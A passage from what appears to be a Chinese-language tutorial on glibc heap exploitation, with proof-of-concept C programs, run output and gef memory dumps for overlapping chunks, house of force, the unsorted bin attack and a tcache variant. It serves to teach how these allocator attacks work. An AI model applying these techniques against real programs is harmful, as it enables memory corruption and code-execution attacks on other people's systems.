p4: 0x1e2b0a0 ~ 0x1e2b8e0
p3: 0x1e2b130 ~ 0x1e2b530

If we memset(p4, 'B', 0xd0), we have:
p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
p3 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa

If we memset(p3, 'C', 0x50), we have:
p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
p3 = CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
```

这个比较简单，就是堆块重叠的问题。通过一个溢出漏洞，改写 unsorted bin 中空闲堆块的 size，改变下一次 malloc 可以返回的堆块大小。

首先分配三个堆块，然后释放掉中间的一个：

```c
gef➤  x/60gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x4141414141414141
0x602030:    0x4141414141414141    0x4141414141414141
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x0000000000000091  <-- chunk 2 [be freed]
0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x6020b0:    0x4141414141414141    0x4141414141414141
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x0000000000000090    0x0000000000000080  <-- chunk 3
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x4141414141414141
0x602150:    0x4141414141414141    0x4141414141414141
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x0000000000020e61  <-- top chunk
0x6021b0:    0x0000000000000000    0x0000000000000000
0x6021c0:    0x0000000000000000    0x0000000000000000
0x6021d0:    0x0000000000000000    0x0000000000000000
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602090, bk=0x602090
 →   Chunk(addr=0x6020a0, size=0x90, flags=PREV_INUSE)
```

chunk 2 被放到了 unsorted bin 中，其 size 值为 0x90。

接下来，假设我们有一个溢出漏洞，可以改写 chunk 2 的 size 值，比如这里我们将其改为 0x111，也就是原本 chunk 2 和 chunk 3 的大小相加，最后一位是 1 表示 chunk 1 是在使用的，其实有没有都无所谓。

```c
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602090, bk=0x602090
 →   Chunk(addr=0x6020a0, size=0x110, flags=PREV_INUSE)
```

这时 unsorted bin 中的数据也更改了。

接下来 malloc 一个大小的等于 chunk 2 和 chunk 3 之和的 chunk 4，这会将 chunk 2 和 chunk 3 都包含进来：

```c
gef➤  x/60gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x4141414141414141
0x602030:    0x4141414141414141    0x4141414141414141
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x0000000000000111  <-- chunk 4
0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x6020b0:    0x4141414141414141    0x4141414141414141
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x0000000000000090    0x0000000000000080  <-- chunk 3
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x4141414141414141
0x602150:    0x4141414141414141    0x4141414141414141
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x0000000000020e61  <-- top chunk
0x6021b0:    0x0000000000000000    0x0000000000000000
0x6021c0:    0x0000000000000000    0x0000000000000000
0x6021d0:    0x0000000000000000    0x0000000000000000
```

这样，相当于 chunk 4 和 chunk 3 就重叠了，两个 chunk 可以互相修改对方的数据。就像上面的运行结果打印出来的那样。



### overlapping_chunks_2

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main() {
    intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
    unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
    int prev_in_use = 0x1;

    p1 = malloc(0x10);
    p2 = malloc(0x80);
    p3 = malloc(0x80);
    p4 = malloc(0x80);
    p5 = malloc(0x10);
    real_size_p1 = malloc_usable_size(p1);
    real_size_p2 = malloc_usable_size(p2);
    real_size_p3 = malloc_usable_size(p3);
    real_size_p4 = malloc_usable_size(p4);
    real_size_p5 = malloc_usable_size(p5);
    memset(p1, 'A', real_size_p1);
    memset(p2, 'A', real_size_p2);
    memset(p3, 'A', real_size_p3);
    memset(p4, 'A', real_size_p4);
    memset(p5, 'A', real_size_p5);
    fprintf(stderr, "Now we allocate 5 chunks on the heap\n\n");
    fprintf(stderr, "chunk p1: %p ~ %p\n", p1, (unsigned char *)p1+malloc_usable_size(p1));
    fprintf(stderr, "chunk p2: %p ~ %p\n", p2, (unsigned char *)p2+malloc_usable_size(p2));
    fprintf(stderr, "chunk p3: %p ~ %p\n", p3, (unsigned char *)p3+malloc_usable_size(p3));
    fprintf(stderr, "chunk p4: %p ~ %p\n", p4, (unsigned char *)p4+malloc_usable_size(p4));
    fprintf(stderr, "chunk p5: %p ~ %p\n", p5, (unsigned char *)p5+malloc_usable_size(p5));

    free(p4);
    fprintf(stderr, "\nLet's free the chunk p4\n\n");

    fprintf(stderr, "Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)\n\n");
    *(unsigned int *)((unsigned char *)p1 + real_size_p1) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; // BUG HERE

    free(p2);

    p6 = malloc(0x1b0 - 0x10);
    real_size_p6 = malloc_usable_size(p6);
    fprintf(stderr, "Allocating a new chunk 6: %p ~ %p\n\n", p6, (unsigned char *)p6+real_size_p6);

    fprintf(stderr, "Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)\n");
    fprintf(stderr, "p3 before = %s\n", (char *)p3);
    memset(p6, 'B', 0xd0);
    fprintf(stderr, "p3 after  = %s\n", (char *)p3);
}
$ gcc -g overlapping_chunks_2.c
$ ./a.out
Now we allocate 5 chunks on the heap

chunk p1: 0x18c2010 ~ 0x18c2028
chunk p2: 0x18c2030 ~ 0x18c20b8
chunk p3: 0x18c20c0 ~ 0x18c2148
chunk p4: 0x18c2150 ~ 0x18c21d8
chunk p5: 0x18c21e0 ~ 0x18c21f8

Let's free the chunk p4

Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)

Allocating a new chunk 6: 0x18c2030 ~ 0x18c21d8

Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)
p3 before = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
p3 after  = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
```

同样是堆块重叠的问题，前面那个是在 chunk 已经被 free，加入到了 unsorted bin 之后，再修改其 size 值，然后 malloc 一个不一样的 chunk 出来，而这里是在 free 之前修改 size 值，使 free 错误地修改了下一个 chunk 的 prev_size 值，导致中间的 chunk 强行合并。另外前面那个重叠是相邻堆块之间的，而这里是不相邻堆块之间的。

我们需要五个堆块，假设第 chunk 1 存在溢出，可以改写第二个 chunk 2 的数据，chunk 5 的作用是防止释放 chunk 4 后被合并进 top chunk。所以我们要重叠的区域是 chunk 2 到 chunk 4。首先将 chunk 4 释放掉，注意看 chunk 5 的 prev_size 值：

```c
gef➤  x/70gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x0000000000000091  <-- chunk 2
0x602030:    0x4141414141414141    0x4141414141414141
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x4141414141414141
0x6020a0:    0x4141414141414141    0x4141414141414141
0x6020b0:    0x4141414141414141    0x0000000000000091  <-- chunk 3
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x4141414141414141    0x4141414141414141
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x0000000000000091  <-- chunk 4 [be freed]
0x602150:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x4141414141414141
0x6021b0:    0x4141414141414141    0x4141414141414141
0x6021c0:    0x4141414141414141    0x4141414141414141
0x6021d0:    0x0000000000000090    0x0000000000000020  <-- chunk 5 <-- prev_size
0x6021e0:    0x4141414141414141    0x4141414141414141
0x6021f0:    0x4141414141414141    0x0000000000020e11  <-- top chunk
0x602200:    0x0000000000000000    0x0000000000000000
0x602210:    0x0000000000000000    0x0000000000000000
0x602220:    0x0000000000000000    0x0000000000000000
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602140, bk=0x602140
 →   Chunk(addr=0x602150, size=0x90, flags=PREV_INUSE)
```

free chunk 4 被放入 unsorted bin，大小为 0x90。

接下来是最关键的一步，利用 chunk 1 的溢出漏洞，将 chunk 2 的 size 值修改为 chunk 2 和 chunk 3 的大小之和，即 0x90+0x90+0x1=0x121，最后的 1 是标志位。这样当我们释放 chunk 2 的时候，malloc 根据这个被修改的 size 值，会以为 chunk 2 加上 chunk 3 的区域都是要释放的，然后就错误地修改了 chunk 5 的 prev_size。接着，它发现紧邻的一块 chunk 4 也是 free 状态，就把它俩合并在了一起，组成一个大 free chunk，放进 unsorted bin 中。

```c
gef➤  x/70gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x00000000000001b1  <-- chunk 2 [be freed] <-- unsorted bin
0x602030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x602040:    0x4141414141414141    0x4141414141414141
0x602050:    0x4141414141414141    0x4141414141414141
0x602060:    0x4141414141414141    0x4141414141414141
0x602070:    0x4141414141414141    0x4141414141414141
0x602080:    0x4141414141414141    0x4141414141414141
0x602090:    0x4141414141414141    0x4141414141414141
0x6020a0:    0x4141414141414141    0x4141414141414141
0x6020b0:    0x4141414141414141    0x0000000000000091  <-- chunk 3
0x6020c0:    0x4141414141414141    0x4141414141414141
0x6020d0:    0x4141414141414141    0x4141414141414141
0x6020e0:    0x4141414141414141    0x4141414141414141
0x6020f0:    0x4141414141414141    0x4141414141414141
0x602100:    0x4141414141414141    0x4141414141414141
0x602110:    0x4141414141414141    0x4141414141414141
0x602120:    0x4141414141414141    0x4141414141414141
0x602130:    0x4141414141414141    0x4141414141414141
0x602140:    0x4141414141414141    0x0000000000000091  <-- chunk 4 [be freed]
0x602150:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
0x602160:    0x4141414141414141    0x4141414141414141
0x602170:    0x4141414141414141    0x4141414141414141
0x602180:    0x4141414141414141    0x4141414141414141
0x602190:    0x4141414141414141    0x4141414141414141
0x6021a0:    0x4141414141414141    0x4141414141414141
0x6021b0:    0x4141414141414141    0x4141414141414141
0x6021c0:    0x4141414141414141    0x4141414141414141
0x6021d0:    0x00000000000001b0    0x0000000000000020  <-- chunk 5 <-- prev_size
0x6021e0:    0x4141414141414141    0x4141414141414141
0x6021f0:    0x4141414141414141    0x0000000000020e11  <-- top chunk
0x602200:    0x0000000000000000    0x0000000000000000
0x602210:    0x0000000000000000    0x0000000000000000
0x602220:    0x0000000000000000    0x0000000000000000
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602020, bk=0x602020
 →   Chunk(addr=0x602030, size=0x1b0, flags=PREV_INUSE)
```

现在 unsorted bin 里的 chunk 的大小为 0x1b0，即 0x90*3。咦，所以 chunk 3 虽然是使用状态，但也被强行算在了 free chunk 的空间里了。

最后，如果我们分配一块大小为 0x1b0-0x10 的大空间，返回的堆块即是包括了 chunk 2 + chunk 3 + chunk 4 的大 chunk。这时 chunk 6 和 chunk 3 就重叠了，结果就像上面运行时打印出来的一样。



### house_of_force

在`glibc 2.23`下，通过控制`top chunk`的`size`域为一个特别大的值，导致可以通过`malloc`特别大的值或者负数来将`top chunk`的指针指向任意位置。

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main() {
    fprintf(stderr, "We will overwrite a variable at %p\n\n", bss_var);

    intptr_t *p1 = malloc(0x10);
    int real_size = malloc_usable_size(p1);
    memset(p1, 'A', real_size);
    fprintf(stderr, "Let's allocate the first chunk of 0x10 bytes: %p.\n", p1);
    fprintf(stderr, "Real size of our allocated chunk is 0x%x.\n\n", real_size);

    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
    fprintf(stderr, "Overwriting the top chunk size with a big value so the malloc will never call mmap.\n");
    fprintf(stderr, "Old size of top chunk: %#llx\n", *((unsigned long long int *)ptr_top));
    ptr_top[0] = -1;
    fprintf(stderr, "New size of top chunk: %#llx\n", *((unsigned long long int *)ptr_top));

    unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
    fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size, we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
    void *new_ptr = malloc(evil_size);
    int real_size_new = malloc_usable_size(new_ptr);
    memset((char *)new_ptr + real_size_new - 0x20, 'A', 0x20);
    fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr);

    void* ctr_chunk = malloc(0x30);
    fprintf(stderr, "malloc(0x30) => %p!\n", ctr_chunk);
    fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.\n");

    fprintf(stderr, "old string: %s\n", bss_var);
    strcpy(ctr_chunk, "YEAH!!!");
    fprintf(stderr, "new string: %s\n", bss_var);
}

```

```c
$ gcc -g house_of_force.c
$ ./a.out
We will overwrite a variable at 0x601080

Let's allocate the first chunk of 0x10 bytes: 0x824010.
Real size of our allocated chunk is 0x18.

Overwriting the top chunk size with a big value so the malloc will never call mmap.
Old size of top chunk: 0x20fe1
New size of top chunk: 0xffffffffffffffff

The value we want to write to at 0x601080, and the top chunk is at 0x824028, so accounting for the header size, we will malloc 0xffffffffffddd048 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x824030
malloc(0x30) => 0x601080!

Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.
old string: This is a string that we want to overwrite.
new string: YEAH!!!
```

我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。

当存在堆溢出漏洞时，可以改写 top chunk 的头部，然后将其改为一个非常大的值（0xffffffffffffffff 即 -1），以确保所有的 malloc 将使用 top chunk 分配，而不会调用 mmap。这时如果攻击者 malloc 一个很大的数目（负有符号整数），top chunk 的位置加上这个大数，造成整数溢出，结果是 top chunk 能够被转移到堆之前的内存地址（如程序的 .bss 段、.data 段、GOT 表等），下次再执行 malloc 时，攻击者就能够控制转移之后地址处的内存。

在计算机中，地址是无符号整数。利用整数溢出，如果我们加一个非常大的数，效果等同于减去一个数，从而让指针“回绕”到低地址

```c
目标地址：bss_var (0x601080)
Top Chunk：0x824028
计算结果：0xffffffffffddd048
当malloc(0xffffffffffddd048)时，通过地址溢出计算，新的chunk起始地址便在0x601080处
```

首先随意分配一个 chunk，此时内存里存在两个 chunk，即 chunk 1 和 top chunk：

```c
gef➤  x/8gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0x0000000000020fe1  <-- top chunk
0x602030:    0x0000000000000000    0x0000000000000000
```

chunk 1 真实可用的内存有 0x18 字节。

假设 chunk 1 存在溢出，利用该漏洞我们现在将 top chunk 的 size 值改为一个非常大的数：-1

```c
gef➤  x/8gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0xffffffffffffffff  <-- modified top chunk
0x602030:    0x0000000000000000    0x0000000000000000
```

改写之后的 size==0xffffffffffffffff

现在我们可以 malloc 一个任意大小的内存而不用调用 mmap 了。接下来 malloc 一个 chunk，使得该 chunk 刚好分配到我们想要控制的那块区域为止，这样的话，topchunk就被我们修改到目标区域了，在下一次 malloc 时，就可以返回到我们想要控制的区域了。计算方法是用**目标地址减去 top chunk 地址，再减去 chunk 头的大小**

```c
gef➤  x/8gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000021
0x602010:    0x4141414141414141    0x4141414141414141
0x602020:    0x4141414141414141    0xfffffffffffff051
0x602030:    0x0000000000000000    0x0000000000000000
gef➤  x/12gx 0x602010+0xfffffffffffff050
0x601060:    0x4141414141414141    0x4141414141414141
0x601070:    0x4141414141414141    0x0000000000000fa9  <-- top chunk
0x601080 <bss_var>:    0x2073692073696854    0x676e697274732061  <-- target
0x601090 <bss_var+16>:    0x6577207461687420    0x6f7420746e617720
0x6010a0 <bss_var+32>:    0x6972777265766f20    0x00000000002e6574
0x6010b0:    0x0000000000000000    0x0000000000000000
```

再次 malloc，将目标地址包含进来即可，现在我们就成功控制了目标内存：

```c
gef➤  x/12gx 0x602010+0xfffffffffffff050
0x601060:    0x4141414141414141    0x4141414141414141
0x601070:    0x4141414141414141    0x0000000000000041  <-- chunk 2
0x601080 <bss_var>:    0x2073692073696854    0x676e697274732061  <-- target
0x601090 <bss_var+16>:    0x6577207461687420    0x6f7420746e617720
0x6010a0 <bss_var+32>:    0x6972777265766f20    0x00000000002e6574
0x6010b0:    0x0000000000000000    0x0000000000000f69  <-- top chunk
```





### unsorted_bin_attack

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    unsigned long stack_var = 0;
    fprintf(stderr, "The target we want to rewrite on stack: %p -> %ld\n\n", &stack_var, stack_var);

    unsigned long *p  = malloc(0x80);
    unsigned long *p1 = malloc(0x10);
    fprintf(stderr, "Now, we allocate first small chunk on the heap at: %p\n",p);

    free(p);
    fprintf(stderr, "We free the first chunk now. Its bk pointer point to %p\n", (void*)p[1]);

    p[1] = (unsigned long)(&stack_var - 2);
    fprintf(stderr, "We write it with the target address-0x10: %p\n\n", (void*)p[1]);

    malloc(0x80);
    fprintf(stderr, "Let's malloc again to get the chunk we just free: %p -> %p\n", &stack_var, (void*)stack_var);

```

```c
$ gcc -g unsorted_bin_attack.c
$ ./a.out
The target we want to rewrite on stack: 0x7ffc9b1d61b0 -> 0

Now, we allocate first small chunk on the heap at: 0x1066010
We free the first chunk now. Its bk pointer point to 0x7f2404cf5b78
We write it with the target address-0x10: 0x7ffc9b1d61a0

Let's malloc again to get the chunk we just free: 0x7ffc9b1d61b0 -> 0x7f2404cf5b78
```

unsorted bin 攻击通常是为更进一步的攻击做准备的，我们知道 unsorted bin 是一个双向链表，在分配时会通过 unlink 操作将 chunk 从链表中移除，所以如果能够控制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过 unlink 将 libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻击提供便利。

unlink 的对 unsorted bin 的操作是这样的：

```c
          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

其中 `bck = victim->bk`

首先分配两个 chunk，然后释放掉第一个，它将被加入到 unsorted bin 中：

```c
gef➤  x/26gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 1 [be freed]
0x602010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
0x602020:    0x0000000000000000    0x0000000000000000
0x602030:    0x0000000000000000    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000000
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000090    0x0000000000000020  <-- chunk 2
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000020f51  <-- top chunk
0x6020c0:    0x0000000000000000    0x0000000000000000
gef➤  x/4gx &stack_var-2
0x7fffffffdc50:    0x00007fffffffdd60    0x0000000000400712
0x7fffffffdc60:    0x0000000000000000    0x0000000000602010
gef➤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)
```

然后假设存在一个溢出漏洞，可以让我们修改 chunk 1 的数据。然后我们将 chunk 1 的 bk 指针修改为指向目标地址 - 2，也就相当于是在目标地址处有一个 fake free chunk，然后 malloc：

```c
gef➤  x/26gx 0x602010-0x10
0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 3
0x602010:    0x00007ffff7dd1b78    0x00007fffffffdc50
0x602020:    0x0000000000000000    0x0000000000000000
0x602030:    0x0000000000000000    0x0000000000000000
0x602040:    0x0000000000000000    0x0000000000000000
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000090    0x0000000000000021  <-- chunk 2
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000020f51  <-- top chunk
0x6020c0:    0x0000000000000000    0x0000000000000000
gef➤  x/4gx &stack_var-2
0x7fffffffdc50:    0x00007fffffffdc80    0x0000000000400756  <-- fake chunk
0x7fffffffdc60:    0x00007ffff7dd1b78    0x0000000000602010      <-- fd->TAIL,目标地址已经被修改为unsorted bin头部地址
```

从而泄漏了 unsorted bin 的头部地址。

#### libc 2.27

利用tcache posioning

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    unsigned long stack_var = 0;
    fprintf(stderr, "The target we want to rewrite on stack: %p -> %ld\n\n", &stack_var, stack_var);

    unsigned long *p = malloc(0x80);
    unsigned long *p1 = malloc(0x10);
    fprintf(stderr, "Now, we allocate first small chunk on the heap at: %p\n",p);

    free(p);
    fprintf(stderr, "Freed the first chunk to put it in a tcache bin\n");

    p[0] = (unsigned long)(&stack_var);
    fprintf(stderr, "Overwrite the next ptr with the target address\n");
    malloc(0x80);
    malloc(0x80);
    fprintf(stderr, "Now we malloc twice to make tcache struct's counts '0xff'\n\n");

    free(p);
    fprintf(stderr, "Now free again to put it in unsorted bin\n");
    p[1] = (unsigned long)(&stack_var - 2);
    fprintf(stderr, "Now write its bk ptr with the target address-0x10: %p\n\n", (void*)p[1]);

    malloc(0x80);
    fprintf(stderr, "Finally malloc again to get the chunk at target address: %p -> %p\n", &stack_var, (void*)stack_var);
}
```

```c
$ gcc -g tcache_unsorted_bin_attack.c
$ ./a.out
The target we want to rewrite on stack: 0x7ffef0884c10 -> 0

Now, we allocate first small chunk on the heap at: 0x564866907260
Freed the first chunk to put it in a tcache bin
Overwrite the next ptr with the target address
Now we malloc twice to make tcache struct's counts '0xff'

Now free again to put it in unsorted bin
Now write its bk ptr with the target address-0x10: 0x7ffef0884c00

Finally malloc again to get the chunk at target address: 0x7ffef0884c10 -> 0x7f69ba1d8ca0
```

我们知道由于 tcache 的存在，malloc 从 unsorted bin 取 chunk 的时候，如果对应的 tcache bin 还未装满，则会将 unsorted bin 里的 chunk 全部放进对应的 tcache bin，然后再从 tcache bin 中取出。那么问题就来了，在放进 tcache bin 的这个过程中，malloc 会以为我们的 target address 也是一个 chunk，然而这个 "chunk" 是过不了检查的，将抛出 "memory corruption" 的错误：

```c
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
              || __builtin_expect (chunksize_nomask (victim)
                   > av->system_mem, 0))
            malloc_printerr ("malloc(): memory corruption");
```



















